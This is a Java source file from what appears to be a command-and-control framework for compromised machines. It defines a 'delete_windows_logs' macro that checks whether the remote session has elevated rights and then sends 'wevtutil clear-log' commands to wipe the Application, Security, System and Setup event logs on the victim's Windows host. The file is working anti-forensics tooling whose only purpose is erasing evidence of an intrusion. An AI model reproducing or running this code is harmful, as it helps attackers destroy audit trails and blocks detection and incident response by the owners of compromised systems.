package c2.session.macro;

import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.WindowsCmdLineHelper;

public class WindowsLogDeleterMacro extends AbstractCommandMacro {

	private IOManager io;
	
	@Override
	public boolean isCommandMatch(String cmd) {
		if(cmd.startsWith("delete_windows_logs")) {
			return true;
		}else {
			return false;
		}
	}

	@Override
	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
		this.io = io;
		//Discard reference to harvest processor, it isn't needed.
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		if(WindowsCmdLineHelper.isClientElevated(sessionId, io)) {
			String[] cmdElements = cmd.split(" ");
			if(cmdElements.length == 1 || (cmdElements.length == 2 && cmdElements[1].equals("all"))) {
				clearApplicationLog(sessionId, outcome);
				clearSecurityLog(sessionId, outcome);
				clearSystemLog(sessionId, outcome);
				clearSetupLog(sessionId, outcome);
				outcome.addMacroMessage("System Log Deletion Complete");
			}else {
				if(cmdElements.length == 2) {
					if(cmdElements[1].equalsIgnoreCase("application")) {
						clearApplicationLog(sessionId, outcome);
						outcome.addMacroMessage("System Application Log Deletion Complete");
					}else if(cmdElements[1].equalsIgnoreCase("security")) {
						clearSecurityLog(sessionId, outcome);
						outcome.addMacroMessage("System Security Log Deletion Complete");
					}else if(cmdElements[1].equalsIgnoreCase("system")) {
						clearSystemLog(sessionId, outcome);
						outcome.addMacroMessage("System System Log Deletion Complete");
					}else if(cmdElements[1].equalsIgnoreCase("setup")) {
						clearSetupLog(sessionId, outcome);
						outcome.addMacroMessage("System Setup Log Deletion Complete");
					}else {
						outcome.addError("Unknown log type: " + cmd);
					}
				}else {
					outcome.addError("Too many arguments: " + cmd);
				}
			}
		}else {
			outcome.addError("Daemon session is not elevated, cannot delete windows logs");
		}
		return outcome;
	}
	
	public final String WINDOWS_LOG_CLEAR_CMD = "wevtutil clear-log";
	public final String APPLICATION_LOG_SUFFIX = " Application";
	public final String SECURITY_LOG_SUFFIX = " Security";
	public final String SETUP_LOG_SUFFIX = " Setup";
	public final String SYSTEM_LOG_SUFFIX = " System";
	
	private void clearApplicationLog(int sessionId, MacroOutcome outcome) {
		String cmd = WINDOWS_LOG_CLEAR_CMD + APPLICATION_LOG_SUFFIX;
		outcome.addSentCommand(cmd);
		io.sendCommand(sessionId, cmd);
	}
	
	private void clearSecurityLog(int sessionId, MacroOutcome outcome) {
		String cmd = WINDOWS_LOG_CLEAR_CMD + SECURITY_LOG_SUFFIX;
		outcome.addSentCommand(cmd);
		io.sendCommand(sessionId, cmd);
	}
	
	private void clearSystemLog(int sessionId, MacroOutcome outcome) {
		String cmd = WINDOWS_LOG_CLEAR_CMD + SYSTEM_LOG_SUFFIX;
		outcome.addSentCommand(cmd);
		io.sendCommand(sessionId, cmd);
	}
	
	private void clearSetupLog(int sessionId, MacroOutcome outcome) {
		String cmd = WINDOWS_LOG_CLEAR_CMD + SETUP_LOG_SUFFIX;
		outcome.addSentCommand(cmd);
		io.sendCommand(sessionId, cmd);
	}

}
